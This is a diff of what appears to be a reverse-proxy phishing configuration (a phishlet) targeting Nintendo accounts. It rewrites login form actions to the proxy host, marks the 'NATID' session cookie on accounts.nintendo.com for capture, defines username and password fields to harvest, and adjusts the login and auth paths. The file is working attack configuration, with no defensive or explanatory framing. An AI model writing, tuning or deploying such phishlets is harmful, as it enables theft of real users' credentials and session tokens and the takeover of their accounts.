@@ -7,12 +7,12 @@ sub_filters:
   - {triggers_on: 'nintendo.nl', orig_sub: 'accounts', domain: 'nintendo.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
 
 auth_tokens:
-  - domain: 'nintendo.com'
+  - domain: 'accounts.nintendo.com'
     keys: ['NATID']
 
 auth_urls:
-  - '/home/news'
-  - '/home/.*'   
+  - '/'
+  - '/'   
 
 credentials:
   username:
@@ -26,4 +26,4 @@ credentials:
 
 login:
   domain: 'accounts.nintendo.com'
-  path: '/login'
+  path: '/'
